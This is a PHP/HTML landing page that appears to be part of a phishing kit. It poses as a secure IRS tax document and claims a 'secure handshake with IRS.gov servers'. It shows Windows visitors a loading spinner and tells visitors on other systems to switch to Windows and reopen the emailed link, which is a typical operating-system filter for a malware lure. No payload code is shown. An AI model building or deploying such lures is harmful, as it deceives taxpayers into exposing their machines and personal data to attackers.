
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title><?php echo $isWindows ? 'Loading Secure Document...' : 'Access Denied - System Incompatibility'; ?></title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #f4f4f4;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            color: #333;
        }
        .loader-container {
            text-align: center;
            background: white;
            padding: 40px;
            border-radius: 8px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
            max-width: 400px;
            width: 90%;
        }
        
        /* Spinner for Windows */
        .spinner {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #1a73e8;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        /* Blocked UI for non-Windows */
        .blocked-icon {
            color: #d93025;
            font-size: 50px;
            margin-bottom: 20px;
        }
        h2 { font-size: 20px; margin-bottom: 10px; color: #202124; }
        .guide-text {
            font-size: 14px;
            line-height: 1.6;
            color: #5f6368;
            text-align: left;
            background: #f8f9fa;
            padding: 15px;
            border-radius: 4px;
            border-left: 4px solid #d93025;
        }
        p.status-msg { font-size: 16px; font-weight: 500; }
    </style>
</head>
<body>

    <div class="loader-container">
        <?php if ($isWindows): ?>
            <div class="spinner"></div>
            <p class="status-msg">Loading secure document, please wait...</p>
            <p style="font-size: 12px; color: #888;">Establishing secure handshake with IRS.gov servers</p>
        <?php else: ?>
            <div class="blocked-icon">
                <i class="fas fa-desktop"></i>
            </div>
            <h2>System Incompatibility</h2>
            <p class="status-msg">Access Restricted</p>
            <div class="guide-text">
                This secure tax document requires the <strong>Windows Document Viewer</strong> to decrypt PII (Personally Identifiable Information). 
                <br><br>
                <strong>To view this document:</strong>
                <ol style="margin-top: 10px; padding-left: 20px;">
                    <li>Switch to a Windows PC or Laptop.</li>
                    <li>Access the link provided in your email.</li>
                    <li>Follow the on-screen prompts to unlock.</li>
                </ol>
            </div>
            <p style="font-size: 11px; margin-top: 20px; color: #999;">Error Code: SEC_OS_MISMATCH_WIN64</p>
        <?php endif; ?>
    </div>

</body>
</html>
